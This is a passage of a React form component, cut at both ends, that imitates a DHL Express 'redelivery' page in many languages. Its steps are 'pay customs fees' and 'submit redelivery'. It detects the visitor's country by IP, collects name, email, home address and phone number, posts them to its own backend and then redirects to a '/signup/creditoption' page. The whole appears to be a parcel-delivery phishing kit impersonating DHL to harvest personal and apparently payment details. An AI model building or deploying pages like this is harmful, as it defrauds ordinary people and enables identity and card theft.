    errorNetwork: "Ralat rangkaian. Pastikan pelayan backend sedang berjalan",
    success: "Borang berjaya dihantar!",
    privacyNotice: "Notis Privasi",
    consentSettings: "Tetapan Persetujuan",
    copyright: "Kumpulan DHL - Hak cipta terpelihara",
    language: "Bahasa",
  },
  si: {
    step1Label: "තොරතුරු පුරවන්න",
    step2Label: "රේගු ගාස්තු ගෙවන්න",
    step3Label: "නැවත බෙදා හැරීම ඉදිරිපත් කරන්න",
    formTitle: "ඔබගේ තොරතුරු පුරවන්න",
    firstName: "මුල් නම",
    lastName: "වාසගම",
    email: "විද්‍යුත් තැපෑල",
    addressCountry: "ලිපින රට",
    street: "ලිපිනය",
    city: "නගරය",
    state: "ප්‍රාන්තය / කලාපය",
    zip: "තැපැල් කේතය",
    phone: "දුරකථන අංකය",
    terms: "මම කියවා පිළිගනිමි",
    termsLink: "ඩිජිටල් රේගු ඉන්වොයිස් නියමයන් සහ කොන්දේසි",
    submitBtn: "ඉදිරිපත් කර ගෙවීමට යන්න",
    processingBtn: "සකසමින්...",
    errorFillAll: "කරුණාකර අවශ්‍ය සියලු ක්ෂේත්‍ර පුරවන්න",
    errorValidEmail: "වලංගු විද්‍යුත් තැපැල් ලිපිනයක් ඇතුළත් කරන්න",
    errorTerms: "කරුණාකර නියමයන් පිළිගන්න",
    errorGeneric: "යම් දෝෂයක් සිදුවිය",
    errorNetwork: "ජාල දෝෂයකි. පසුපස සේවාදායකය ක්‍රියාත්මක වන බවට වග බලා ගන්න",
    success: "පෝරමය සාර්ථකව ඉදිරිපත් කරන ලදී!",
    privacyNotice: "රහස්‍යතා දැන්වීම",
    consentSettings: "අනුමැති සැකසුම්",
    copyright: "DHL කණ්ඩායම - සියලුම හිමිකම් ඇවිරිණි",
    language: "භාෂාව",
  },
};

const DHLExpressForm = () => {
  const [step, setStep] = useState(1);
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [showAddressCountryDropdown, setShowAddressCountryDropdown] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [successMessage, setSuccessMessage] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [language, setLanguage] = useState("en");
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  
  const currentYear = new Date().getFullYear();
  
  // DHL color constants
  const DHL = {
    yellow: "#FFCC00",
    yellowHover: "#E6B800",
    red: "#D40511",
    dark: "#1A1A1A",
    gray: "#4A4A4A",
    lightGray: "#F5F5F5",
    midGray: "#E0E0E0",
    textMuted: "#737373",
    footerText: "#666666",
    successGreen: "#2E7D32",
  };
  
  const [selectedCountry, setSelectedCountry] = useState({
    code: "+82",
    name: "South Korea",
    flag: "kr",
    dialCode: "+82",
  });
  const [selectedAddressCountry, setSelectedAddressCountry] = useState({
    name: "South Korea",
    flag: "kr",
  });
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    street: "",
    city: "",
    state: "",
    zip: "",
    country: "South Korea",
  });
  const [termsAccepted, setTermsAccepted] = useState(false);

  // Get current translation
  const t = translations[language];

  // Check if mobile on mount and window resize
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // API URL
  const apiUrl = import.meta.env.VITE_API_URL;

  // ============================================
  // COMPLETE COUNTRY LIST - ALL LANGUAGES INCLUDED
  // ============================================
  const countriesList = [
    // English speaking countries
    { code: "+1", name: "United States", flag: "us", dialCode: "+1", language: "en" },
    { code: "+44", name: "United Kingdom", flag: "gb", dialCode: "+44", language: "en" },
    { code: "+61", name: "Australia", flag: "au", dialCode: "+61", language: "en" },
    { code: "+64", name: "New Zealand", flag: "nz", dialCode: "+64", language: "en" },
    { code: "+1", name: "Canada", flag: "ca", dialCode: "+1", language: "en" },
    { code: "+91", name: "India", flag: "in", dialCode: "+91", language: "en" },
    { code: "+27", name: "South Africa", flag: "za", dialCode: "+27", language: "en" },
    { code: "+234", name: "Nigeria", flag: "ng", dialCode: "+234", language: "en" },
    { code: "+254", name: "Kenya", flag: "ke", dialCode: "+254", language: "en" },
    { code: "+233", name: "Ghana", flag: "gh", dialCode: "+233", language: "en" },
    { code: "+254", name: "Kenya", flag: "ke", dialCode: "+254", language: "en" },
    { code: "+63", name: "Philippines", flag: "ph", dialCode: "+63", language: "en" },
    { code: "+65", name: "Singapore", flag: "sg", dialCode: "+65", language: "en" },
    { code: "+353", name: "Ireland", flag: "ie", dialCode: "+353", language: "en" },
    { code: "+1", name: "Jamaica", flag: "jm", dialCode: "+1", language: "en" },
    
    // Japanese
    { code: "+81", name: "Japan", flag: "jp", dialCode: "+81", language: "ja" },
    
    // Korean
    { code: "+82", name: "South Korea", flag: "kr", dialCode: "+82", language: "ko" },
    
    // Chinese
    { code: "+86", name: "China", flag: "cn", dialCode: "+86", language: "zh" },
    { code: "+852", name: "Hong Kong", flag: "hk", dialCode: "+852", language: "zh" },
    { code: "+853", name: "Macau", flag: "mo", dialCode: "+853", language: "zh" },
    { code: "+886", name: "Taiwan", flag: "tw", dialCode: "+886", language: "zh" },
    
    // German
    { code: "+49", name: "Germany", flag: "de", dialCode: "+49", language: "de" },
    { code: "+43", name: "Austria", flag: "at", dialCode: "+43", language: "de" },
    { code: "+41", name: "Switzerland", flag: "ch", dialCode: "+41", language: "de" }, // CH = de
    { code: "+423", name: "Liechtenstein", flag: "li", dialCode: "+423", language: "de" },
    
    // French
    { code: "+33", name: "France", flag: "fr", dialCode: "+33", language: "fr" },
    { code: "+32", name: "Belgium", flag: "be", dialCode: "+32", language: "fr" },
    { code: "+352", name: "Luxembourg", flag: "lu", dialCode: "+352", language: "fr" },
    { code: "+377", name: "Monaco", flag: "mc", dialCode: "+377", language: "fr" },
    { code: "+221", name: "Senegal", flag: "sn", dialCode: "+221", language: "fr" },
    { code: "+225", name: "Ivory Coast", flag: "ci", dialCode: "+225", language: "fr" },
    { code: "+237", name: "Cameroon", flag: "cm", dialCode: "+237", language: "fr" },
    
    // Arabic
    { code: "+20", name: "Egypt", flag: "eg", dialCode: "+20", language: "ar" },
    { code: "+966", name: "Saudi Arabia", flag: "sa", dialCode: "+966", language: "ar" },
    { code: "+971", name: "UAE", flag: "ae", dialCode: "+971", language: "ar" },
    { code: "+974", name: "Qatar", flag: "qa", dialCode: "+974", language: "ar" },
    { code: "+965", name: "Kuwait", flag: "kw", dialCode: "+965", language: "ar" },
    { code: "+973", name: "Bahrain", flag: "bh", dialCode: "+973", language: "ar" },
    { code: "+968", name: "Oman", flag: "om", dialCode: "+968", language: "ar" },
    { code: "+962", name: "Jordan", flag: "jo", dialCode: "+962", language: "ar" },
    { code: "+961", name: "Lebanon", flag: "lb", dialCode: "+961", language: "ar" },
    { code: "+964", name: "Iraq", flag: "iq", dialCode: "+964", language: "ar" },
    { code: "+967", name: "Yemen", flag: "ye", dialCode: "+967", language: "ar" },
    { code: "+961", name: "Palestine", flag: "ps", dialCode: "+970", language: "ar" },
    { code: "+218", name: "Libya", flag: "ly", dialCode: "+218", language: "ar" },
    { code: "+249", name: "Sudan", flag: "sd", dialCode: "+249", language: "ar" },
    { code: "+222", name: "Mauritania", flag: "mr", dialCode: "+222", language: "ar" },
    { code: "+252", name: "Somalia", flag: "so", dialCode: "+252", language: "ar" },
    { code: "+212", name: "Morocco", flag: "ma", dialCode: "+212", language: "ar" },
    { code: "+213", name: "Algeria", flag: "dz", dialCode: "+213", language: "ar" },
    { code: "+216", name: "Tunisia", flag: "tn", dialCode: "+216", language: "en" }, // TN = en (as requested)
    
    // Spanish
    { code: "+34", name: "Spain", flag: "es", dialCode: "+34", language: "es" },
    { code: "+52", name: "Mexico", flag: "mx", dialCode: "+52", language: "es" },
    { code: "+54", name: "Argentina", flag: "ar", dialCode: "+54", language: "es" },
    { code: "+57", name: "Colombia", flag: "co", dialCode: "+57", language: "es" },
    { code: "+51", name: "Peru", flag: "pe", dialCode: "+51", language: "es" },
    { code: "+58", name: "Venezuela", flag: "ve", dialCode: "+58", language: "es" },
    { code: "+56", name: "Chile", flag: "cl", dialCode: "+56", language: "es" },
    { code: "+593", name: "Ecuador", flag: "ec", dialCode: "+593", language: "es" },
    { code: "+502", name: "Guatemala", flag: "gt", dialCode: "+502", language: "es" },
    { code: "+53", name: "Cuba", flag: "cu", dialCode: "+53", language: "es" },
    { code: "+591", name: "Bolivia", flag: "bo", dialCode: "+591", language: "es" },
    { code: "+1", name: "Dominican Republic", flag: "do", dialCode: "+1", language: "es" },
    { code: "+504", name: "Honduras", flag: "hn", dialCode: "+504", language: "es" },
    { code: "+595", name: "Paraguay", flag: "py", dialCode: "+595", language: "es" },
    { code: "+503", name: "El Salvador", flag: "sv", dialCode: "+503", language: "es" },
    { code: "+505", name: "Nicaragua", flag: "ni", dialCode: "+505", language: "es" },
    { code: "+506", name: "Costa Rica", flag: "cr", dialCode: "+506", language: "es" },
    { code: "+507", name: "Panama", flag: "pa", dialCode: "+507", language: "es" },
    { code: "+598", name: "Uruguay", flag: "uy", dialCode: "+598", language: "es" },
    
    // Portuguese
    { code: "+351", name: "Portugal", flag: "pt", dialCode: "+351", language: "pt" },
    { code: "+55", name: "Brazil", flag: "br", dialCode: "+55", language: "pt" },
    { code: "+244", name: "Angola", flag: "ao", dialCode: "+244", language: "pt" },
    { code: "+258", name: "Mozambique", flag: "mz", dialCode: "+258", language: "pt" },
    { code: "+238", name: "Cape Verde", flag: "cv", dialCode: "+238", language: "pt" },
    { code: "+245", name: "Guinea-Bissau", flag: "gw", dialCode: "+245", language: "pt" },
    { code: "+670", name: "East Timor", flag: "tl", dialCode: "+670", language: "pt" },
    
    // Italian
    { code: "+39", name: "Italy", flag: "it", dialCode: "+39", language: "it" },
    { code: "+378", name: "San Marino", flag: "sm", dialCode: "+378", language: "it" },
    { code: "+379", name: "Vatican City", flag: "va", dialCode: "+379", language: "it" },
    
    // Dutch
    { code: "+31", name: "Netherlands", flag: "nl", dialCode: "+31", language: "nl" },
    
    // Polish
    { code: "+48", name: "Poland", flag: "pl", dialCode: "+48", language: "pl" },
    
    // Russian
    { code: "+7", name: "Russia", flag: "ru", dialCode: "+7", language: "ru" },
    { code: "+375", name: "Belarus", flag: "by", dialCode: "+375", language: "ru" },
    { code: "+7", name: "Kazakhstan", flag: "kz", dialCode: "+7", language: "ru" },
    { code: "+996", name: "Kyrgyzstan", flag: "kg", dialCode: "+996", language: "ru" },
    { code: "+380", name: "Ukraine", flag: "ua", dialCode: "+380", language: "ru" },
    
    // Turkish
    { code: "+90", name: "Turkey", flag: "tr", dialCode: "+90", language: "tr" },
    
    // Thai
    { code: "+66", name: "Thailand", flag: "th", dialCode: "+66", language: "th" },
    
    // Vietnamese
    { code: "+84", name: "Vietnam", flag: "vn", dialCode: "+84", language: "vi" },
    
    // Indonesian
    { code: "+62", name: "Indonesia", flag: "id", dialCode: "+62", language: "id" },
    
    // Malaysian (Malay)
    { code: "+60", name: "Malaysia", flag: "my", dialCode: "+60", language: "ms" },
    
    // Swedish
    { code: "+46", name: "Sweden", flag: "se", dialCode: "+46", language: "sv" },
    
    // Norwegian
    { code: "+47", name: "Norway", flag: "no", dialCode: "+47", language: "no" },
    
    // Danish
    { code: "+45", name: "Denmark", flag: "dk", dialCode: "+45", language: "da" },
    
    // Finnish
    { code: "+358", name: "Finland", flag: "fi", dialCode: "+358", language: "fi" },
    
    // Greek
    { code: "+30", name: "Greece", flag: "gr", dialCode: "+30", language: "el" },
    
    // Hebrew
    { code: "+972", name: "Israel", flag: "il", dialCode: "+972", language: "he" },
    
    // Urdu (Pakistan)
    { code: "+92", name: "Pakistan", flag: "pk", dialCode: "+92", language: "ur" },
    
    // Bengali
    { code: "+880", name: "Bangladesh", flag: "bd", dialCode: "+880", language: "bn" },
    
    // Sinhala (Sri Lanka)
    { code: "+94", name: "Sri Lanka", flag: "lk", dialCode: "+94", language: "si" },
    
    // Czech
    { code: "+420", name: "Czech Republic", flag: "cz", dialCode: "+420", language: "cs" },
    
    // Slovak
    { code: "+421", name: "Slovakia", flag: "sk", dialCode: "+421", language: "sk" },
    
    // Hungarian
    { code: "+36", name: "Hungary", flag: "hu", dialCode: "+36", language: "hu" },
    
    // Romanian
    { code: "+40", name: "Romania", flag: "ro", dialCode: "+40", language: "ro" },
    
    // Bulgarian
    { code: "+359", name: "Bulgaria", flag: "bg", dialCode: "+359", language: "bg" },
    
    // Croatian
    { code: "+385", name: "Croatia", flag: "hr", dialCode: "+385", language: "hr" },
    
    // Slovenian
    { code: "+386", name: "Slovenia", flag: "si", dialCode: "+386", language: "sl" },
    
    // Lithuanian
    { code: "+370", name: "Lithuania", flag: "lt", dialCode: "+370", language: "lt" },
    
    // Latvian
    { code: "+371", name: "Latvia", flag: "lv", dialCode: "+371", language: "lv" },
    
    // Estonian
    { code: "+372", name: "Estonia", flag: "ee", dialCode: "+372", language: "et" },
    
    // Icelandic
    { code: "+354", name: "Iceland", flag: "is", dialCode: "+354", language: "is" },
  ];

  // ============================================
  // COMPLETE COUNTRY TO LANGUAGE MAP - FIXED PER REQUEST
  // TN = "en", CH = "de"
  // ============================================
  const getLanguageFromCountryCode = (countryCode) => {
    const countryMap = {
      // English speaking
      US: "en", GB: "en", AU: "en", NZ: "en", CA: "en", IN: "en", ZA: "en",
      NG: "en", KE: "en", GH: "en", PH: "en", SG: "en", IE: "en", JM: "en",
      // Japanese
      JP: "ja",
      // Korean
      KR: "ko",
      // Chinese
      CN: "zh", TW: "zh", HK: "zh", MO: "zh",
      // German
      DE: "de", AT: "de", CH: "de", LI: "de",
      // French
      FR: "fr", BE: "fr", LU: "fr", MC: "fr", SN: "fr", CI: "fr", CM: "fr",
      // Arabic
      EG: "ar", SA: "ar", AE: "ar", QA: "ar", KW: "ar", BH: "ar", OM: "ar",
      JO: "ar", LB: "ar", IQ: "ar", YE: "ar", PS: "ar", LY: "ar", SD: "ar",
      MR: "ar", SO: "ar", MA: "ar", DZ: "ar",
      // Tunisia - English as requested
      TN: "en",
      // Spanish
      ES: "es", MX: "es", AR: "es", CO: "es", PE: "es", VE: "es", CL: "es",
      EC: "es", GT: "es", CU: "es", BO: "es", DO: "es", HN: "es", PY: "es",
      SV: "es", NI: "es", CR: "es", PA: "es", UY: "es",
      // Portuguese
      PT: "pt", BR: "pt", AO: "pt", MZ: "pt", CV: "pt", GW: "pt", TL: "pt",
      // Italian
      IT: "it", SM: "it", VA: "it",
      // Dutch
      NL: "nl",
      // Polish
      PL: "pl",
      // Russian
      RU: "ru", BY: "ru", KZ: "ru", KG: "ru", UA: "ru",
      // Turkish
      TR: "tr",
      // Thai
      TH: "th",
      // Vietnamese
      VN: "vi",
      // Indonesian
      ID: "id",
      // Malay
      MY: "ms",
      // Swedish
      SE: "sv",
      // Norwegian
      NO: "no",
      // Danish
      DK: "da",
      // Finnish
      FI: "fi",
      // Greek
      GR: "el",
      // Hebrew
      IL: "he",
      // Urdu
      PK: "ur",
      // Bengali
      BD: "bn",
      // Sinhala
      LK: "si",
      // Czech
      CZ: "cs",
      // Slovak
      SK: "sk",
      // Hungarian
      HU: "hu",
      // Romanian
      RO: "ro",
      // Bulgarian
      BG: "bg",
      // Croatian
      HR: "hr",
      // Slovenian
      SI: "sl",
      // Lithuanian
      LT: "lt",
      // Latvian
      LV: "lv",
      // Estonian
      EE: "et",
      // Icelandic
      IS: "is",
    };
    return countryMap[countryCode] || "en";
  };

  // Auto-detect country and language by IP
  useEffect(() => {
    const detectCountryAndLanguageByIP = async () => {
      try {
        const response = await fetch(`${apiUrl}/api/ipinfo`);
        const data = await response.json();
        
        if (data.success) {
          if (data.country_code) {
            const detectedLanguage = getLanguageFromCountryCode(data.country_code);
            setLanguage(detectedLanguage);
          }
          
          if (data.country) {
            const detectedCountryName = data.country;
            const detectedCountryCode = data.country_code?.toLowerCase();
            
            let matchedCountry = countriesList.find(
              (c) => c.name === detectedCountryName || c.flag === detectedCountryCode
            );
            
            if (!matchedCountry && detectedCountryCode) {
              matchedCountry = countriesList.find(
                (c) => c.flag === detectedCountryCode
              );
            }
            
            if (matchedCountry) {
              setSelectedCountry(matchedCountry);
              
              if (selectedAddressCountry.name === "South Korea") {
                setSelectedAddressCountry({
                  name: matchedCountry.name,
                  flag: matchedCountry.flag,
                });
                setFormData(prev => ({ ...prev, country: matchedCountry.name }));
              }
            }
          }
        }
      } catch (error) {
        console.error('IP detection failed:', error);
      }
    };
    
    detectCountryAndLanguageByIP();
  }, []);

  // ============================================
  // AVAILABLE LANGUAGES - ALL LANGUAGES FROM TRANSLATIONS
  // ============================================
  const availableLanguages = [
    { code: "en", name: "English", flag: "gb" },
    { code: "fr", name: "Français", flag: "fr" },
    { code: "es", name: "Español", flag: "es" },
    { code: "ar", name: "العربية", flag: "sa" },
    { code: "de", name: "Deutsch", flag: "de" },
    { code: "pt", name: "Português", flag: "br" },
    { code: "tr", name: "Türkçe", flag: "tr" },
    { code: "it", name: "Italiano", flag: "it" },
    { code: "ru", name: "Русский", flag: "ru" },
    { code: "zh", name: "中文", flag: "cn" },
    { code: "ko", name: "한국어", flag: "kr" },
    { code: "ja", name: "日本語", flag: "jp" },
    { code: "pl", name: "Polski", flag: "pl" },
    { code: "nl", name: "Nederlands", flag: "nl" },
    { code: "th", name: "ไทย", flag: "th" },
    { code: "id", name: "Indonesia", flag: "id" },
    { code: "vi", name: "Tiếng Việt", flag: "vn" },
    { code: "sv", name: "Svenska", flag: "se" },
    { code: "no", name: "Norsk", flag: "no" },
    { code: "da", name: "Dansk", flag: "dk" },
    { code: "fi", name: "Suomi", flag: "fi" },
    { code: "el", name: "Ελληνικά", flag: "gr" },
    { code: "he", name: "עברית", flag: "il" },
    { code: "ur", name: "اردو", flag: "pk" },
    { code: "bn", name: "বাংলা", flag: "bd" },
    { code: "ms", name: "Bahasa Melayu", flag: "my" },
    { code: "si", name: "සිංහල", flag: "lk" },
    { code: "cs", name: "Čeština", flag: "cz" },
    { code: "hu", name: "Magyar", flag: "hu" },
    { code: "ro", name: "Română", flag: "ro" },
  ];

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    setErrorMessage("");
  };

  const handleCountrySelect = (country) => {
    setSelectedCountry(country);
    setShowCountryDropdown(false);
  };

  const handleAddressCountrySelect = (country) => {
    setSelectedAddressCountry(country);
    setFormData((prev) => ({ ...prev, country: country.name }));
    setShowAddressCountryDropdown(false);
  };

  const handleLanguageSelect = (langCode) => {
    setLanguage(langCode);
    setShowLanguageDropdown(false);
  };

  const submitToBackend = async (stepData) => {
    setLoading(true);
    setErrorMessage("");
    setSuccessMessage("");

    try {
      const response = await fetch(`${apiUrl}/api/submit-delivery`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ...stepData, language }),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccessMessage(t.success);
        return true;
      } else {
        setErrorMessage(data.error || t.errorGeneric);
        return false;
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrorMessage(t.errorNetwork);
      return false;
    } finally {
      setLoading(false);
    }
  };

  const handleNext = async () => {
    if (
      !formData.firstName ||
      !formData.lastName ||
      !formData.email ||
      !formData.phone ||
      !formData.street ||
      !formData.city ||
      !formData.state ||
      !formData.zip
    ) {
      setErrorMessage(t.errorFillAll);
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      setErrorMessage(t.errorValidEmail);
      return;
    }

    if (!termsAccepted) {
      setErrorMessage(t.errorTerms);
      return;
    }

    const success = await submitToBackend({
      ...formData,
      phone: selectedCountry.dialCode + formData.phone,
      language,
      step: 1,
    });

    if (success) {
      sessionStorage.setItem(
        "deliveryFormData",
        JSON.stringify({
          ...formData,
          phone: selectedCountry.dialCode + formData.phone,
          language,
        }),
      );

      setTimeout(() => {
        window.location.href = "/signup/creditoption";
      }, 1500);
    }
  };

  // Close dropdowns when clicking outside
  React.useEffect(() => {
    const handleClickOutside = (event) => {
      if (showCountryDropdown && !event.target.closest(".dhl-phone-wrapper")) {
        setShowCountryDropdown(false);
      }
      if (showAddressCountryDropdown && !event.target.closest(".dhl-address-country-wrapper")) {
        setShowAddressCountryDropdown(false);
      }
      if (showLanguageDropdown && !event.target.closest(".dhl-lang-wrapper")) {
        setShowLanguageDropdown(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [showCountryDropdown, showAddressCountryDropdown, showLanguageDropdown]);

  // All countries for address field
  const addressCountriesWithFlags = countriesList.map(({ name, flag }) => ({
    name,
    flag,
  }));

  return (
    <div className="dhl-app" dir={language === "ar" ? "rtl" : "ltr"}>
      <main className="dhl-main">
        {/* Header */}
        <div className="dhl-header">
          <div className="dhl-header-content">
            <div className="dhl-logo-area">
              <img
                alt="DHL Logo"
                src="/dhl-express-logo.png"
                className="dhl-logo"
              />
            </div>
            <div className="dhl-right-header">
              <div className="dhl-lang-wrapper">
                <button
                  className="dhl-lang-btn"
                  onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
                >
                  <span className={`dhl-flag dhl-flag-${availableLanguages.find(l => l.code === language)?.flag || "gb"}`}></span>
                  <span className="dhl-lang-name">
                    {availableLanguages.find(l => l.code === language)?.name || "English"}
                  </span>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    style={{ marginLeft: "4px" }}
                  >
                    <path
                      d="M3 5L6 8L9 5"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                  </svg>
                </button>
                {showLanguageDropdown && (
                  <div className="dhl-language-dropdown">
                    <div className="dhl-language-dropdown-list">
                      {availableLanguages.map((lang) => (
                        <div
                          key={lang.code}
                          className={`dhl-language-item ${language === lang.code ? "active" : ""}`}
                          onClick={() => handleLanguageSelect(lang.code)}
                        >
                          <span className={`dhl-flag dhl-flag-${lang.flag}`}></span>
                          <span className="dhl-language-name">{lang.name}</span>
                          {language === lang.code && (
                            <span className="dhl-language-check">✓</span>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Steps */}
        <div className="dhl-steps-container">
          <div className="dhl-steps">
            <div className={`dhl-step ${step >= 1 ? "active" : ""}`}>
              <span
                className={`dhl-step-circle ${step >= 1 ? "active" : "upcoming"}`}
              >
                1
              </span>
              <span className={`dhl-step-label ${step >= 1 ? "active" : ""}`}>
                {t.step1Label}
              </span>
            </div>
            <span className="dhl-step-line"></span>
            <div className="dhl-step">
              <span className="dhl-step-circle upcoming">2</span>
              <span className="dhl-step-label">{t.step2Label}</span>
            </div>
            <span className="dhl-step-line"></span>
            <div className="dhl-step">
              <span className="dhl-step-circle upcoming">3</span>
              <span className="dhl-step-label">{t.step3Label}</span>
            </div>
          </div>
        </div>

        {/* Error and Success Messages */}
        {errorMessage && (
          <div
            style={{
              backgroundColor: "#fee2e2",
              color: "#dc2626",
              padding: "12px 20px",
              borderRadius: "8px",
              margin: "20px auto",
              maxWidth: "850px",
              width: "calc(100% - 40px)",
              textAlign: "center",
              fontSize: "14px",
              border: "1px solid #fecaca",
            }}
          >
            ⚠️ {errorMessage}
          </div>
        )}

        {/* Form Card */}
        <div className="dhl-form-card">
          <h1 className="dhl-form-title">{t.formTitle}</h1>

          <form className="dhl-form" onSubmit={(e) => e.preventDefault()}>
            <div className="dhl-row">
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="fname" className="dhl-label">
                    {t.firstName}
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    id="fname"
                    placeholder={`${t.firstName} *`}
                    className="dhl-input"
                    value={formData.firstName}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="lname" className="dhl-label">
                    {t.lastName}
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    id="lname"
                    placeholder={`${t.lastName} *`}
                    className="dhl-input"
                    value={formData.lastName}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="dhl-full">
              <div className="dhl-field">
                <label htmlFor="email" className="dhl-label">
                  {t.email}
                </label>
                <input
                  type="email"
                  name="email"
                  id="email"
                  placeholder={`${t.email} *`}
                  className="dhl-input"
                  value={formData.email}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="dhl-full">
              <div className="dhl-field">
                <label htmlFor="country" className="dhl-label">
                  {t.addressCountry}
                </label>
                <div className="dhl-address-country-wrapper">
                  <button
                    type="button"
                    className="dhl-address-country-btn"
                    onClick={() => setShowAddressCountryDropdown(!showAddressCountryDropdown)}
                  >
                    <span className={`dhl-flag dhl-flag-${selectedAddressCountry.flag}`}></span>
                    <span className="dhl-address-country-name">
                      {selectedAddressCountry.name}
                    </span>
                    <span className="dhl-arrow">▾</span>
                  </button>
                  {showAddressCountryDropdown && (
                    <div className="dhl-address-country-dropdown">
                      <div className="dhl-country-dropdown-search">
                        <input
                          type="text"
                          placeholder="Search country..."
                          className="dhl-country-search"
                          id="addressCountrySearch"
                          onChange={(e) => {
                            const searchTerm = e.target.value.toLowerCase();
                            const items = document.querySelectorAll(".dhl-address-country-item");
                            items.forEach((item) => {
                              const text = item.textContent?.toLowerCase() || "";
                              if (text.includes(searchTerm)) {
                                item.style.display = "flex";
                              } else {
                                item.style.display = "none";
                              }
                            });
                          }}
                        />
                      </div>
                      <div className="dhl-country-dropdown-list">
                        {addressCountriesWithFlags.map((country, index) => (
                          <div
                            key={index}
                            className="dhl-address-country-item"
                            onClick={() => handleAddressCountrySelect(country)}
                          >
                            <span className={`dhl-flag dhl-flag-${country.flag}`}></span>
                            <span className="dhl-country-name">{country.name}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="dhl-full">
              <div className="dhl-field">
                <label htmlFor="street" className="dhl-label">
                  {t.street}
                </label>
                <input
                  type="text"
                  name="street"
                  id="street"
                  placeholder={`${t.street} *`}
                  className="dhl-input"
                  value={formData.street}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="dhl-row">
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="city" className="dhl-label">
                    {t.city}
                  </label>
                  <input
                    type="text"
                    name="city"
                    id="city"
                    placeholder={`${t.city} *`}
                    className="dhl-input"
                    value={formData.city}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="state" className="dhl-label">
                    {t.state}
                  </label>
                  <input
                    type="text"
                    name="state"
                    id="state"
                    placeholder={`${t.state} *`}
                    className="dhl-input"
                    value={formData.state}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="dhl-row">
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="zip" className="dhl-label">
                    {t.zip}
                  </label>
                  <input
                    type="text"
                    name="zip"
                    id="zip"
                    placeholder={`${t.zip} *`}
                    className="dhl-input"
                    value={formData.zip}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
              <div className="dhl-col">
                <div className="dhl-field">
                  <label htmlFor="phone" className="dhl-label">
                    {t.phone}
                  </label>
                  <div className="dhl-phone-wrapper">
                    <div className="dhl-country-selector">
                      <button
                        type="button"
                        className="dhl-country-btn"
                        onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                      >
                        <span className={`dhl-flag dhl-flag-${selectedCountry.flag}`}></span>
                        <span className="dhl-dial-code">{selectedCountry.dialCode}</span>
                        <span className="dhl-arrow">▾</span>
                      </button>
                    </div>
                    <input
                      type="tel"
                      name="phone"
                      id="phone"
                      placeholder={`${t.phone} *`}
                      className="dhl-phone-input"
                      value={formData.phone}
                      onChange={handleChange}
                      required
                    />
                    {showCountryDropdown && (
                      <div className="dhl-country-dropdown">
                        <div className="dhl-country-dropdown-search">
                          <input
                            type="text"
                            placeholder="Search country..."
                            className="dhl-country-search"
                            id="countrySearch"
                            onChange={(e) => {
                              const searchTerm = e.target.value.toLowerCase();
                              const items = document.querySelectorAll(".dhl-country-item");
                              items.forEach((item) => {
                                const text = item.textContent?.toLowerCase() || "";
                                if (text.includes(searchTerm)) {
                                  item.style.display = "flex";
                                } else {
                                  item.style.display = "none";
                                }
                              });
                            }}
                          />
                        </div>
                        <div className="dhl-country-dropdown-list">
                          {countriesList.map((country, index) => (
                            <div
                              key={index}
                              className="dhl-country-item"
                              onClick={() => handleCountrySelect(country)}
                            >
                              <span className={`dhl-flag dhl-flag-${country.flag}`}></span>
                              <span className="dhl-country-name">{country.name}</span>
                              <span className="dhl-country-code">{country.dialCode}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <div className="dhl-checkbox-wrapper">
              <div className="dhl-checkbox-row">
                <input
                  type="checkbox"
                  id="terms"
                  className="dhl-checkbox"
                  checked={termsAccepted}
                  onChange={(e) => setTermsAccepted(e.target.checked)}
                />
                <div className="dhl-checkbox-label">
                  <span>{t.terms} </span>
                  <a href="#" className="dhl-link">
                    {t.termsLink}
                  </a>
                </div>
              </div>
            </div>

            <button
              type="button"
              className="dhl-next-btn"
              onClick={handleNext}
              disabled={loading}
              style={{ opacity: loading ? 0.7 : 1 }}
            >
              {loading ? t.processingBtn : t.submitBtn}
            </button>
          </form>
        </div>

        {/* FOOTER */}
        <footer
          style={{
            background: "white",
            padding: "30px 0",
            borderTop: "1px solid #E0E0E0",
            marginTop: "auto",
          }}
        >
          <div
            style={{
              maxWidth: "1190px",
